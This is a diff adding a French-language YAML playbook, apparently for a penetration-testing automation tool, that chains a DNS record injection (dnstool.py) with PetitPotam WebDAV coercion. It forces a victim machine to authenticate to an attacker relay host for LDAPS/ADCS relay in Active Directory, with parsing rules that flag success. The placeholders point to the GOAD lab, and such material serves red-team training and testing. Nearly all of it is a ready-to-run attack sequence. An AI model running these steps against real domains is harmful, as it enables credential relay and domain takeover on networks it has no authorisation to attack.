@@ -1,0 +1,55 @@
+id: auto_webdav_coercion
+name: ⛓️ Auto WebDAV Coercion (Relay)
+category: Exploitation
+description: "Injection DNS + PetitPotam WebDAV (Port 80/8080) pour Relay LDAPS/ADCS."
+inputs:
+  - name: dc_ip
+    label: "IP du DC"
+    placeholder: 10.3.10.11
+  - name: target_ip
+    label: "IP Cible (Victime)"
+    placeholder: 10.3.10.22
+  - name: attacker_ip
+    label: "IP Attaquant (Relay)"
+    placeholder: 10.3.10.50
+  - name: webdav_port
+    label: "Port WebDAV (Relay)"
+    default: 8080
+  - name: fake_name
+    label: "Nom DNS temporaire"
+    placeholder: webdav-relay
+    default: webdav-relay
+  - name: domain
+    label: "Domaine"
+    placeholder: north.sevenkingdoms.local
+  - name: username
+    label: "Utilisateur"
+    placeholder: arya.stark
+  - name: password
+    label: "Mot de passe"
+    placeholder: Needle
+
+steps:
+  - name: "1. Injection DNS ({{fake_name}} -> {{attacker_ip}})"
+    command: "dnstool.py -u '{{domain}}\\{{username}}' -p '{{password}}' -r '{{fake_name}}' -a add -d {{attacker_ip}} {{dc_ip}}"
+    extract:
+      dns_status: "successfully"
+
+  - name: "2. Coercion WebDAV ({{fake_name}}@{{webdav_port}}/a)"
+    command: "PetitPotam.py -u '{{username}}' -p '{{password}}' -d '{{domain}}' '{{fake_name}}@{{webdav_port}}/a' '{{target_ip}}'"
+
+parsing:
+  mode: "text"
+  save_results: false 
+  rules:
+    - name: "Injection DNS OK"
+      regex: "successfully"
+      badge: "✅ [DNS]"
+
+    - name: "PetitPotam Envoyé"
+      regex: "Attack.*Succeeded"
+      badge: "🚀 [SENT]"
+
+    - name: "WebClient Désactivé (Erreur 0x7)"
+      regex: "0x00000007"
+      badge: "❌ [NO WEBCLIENT]"
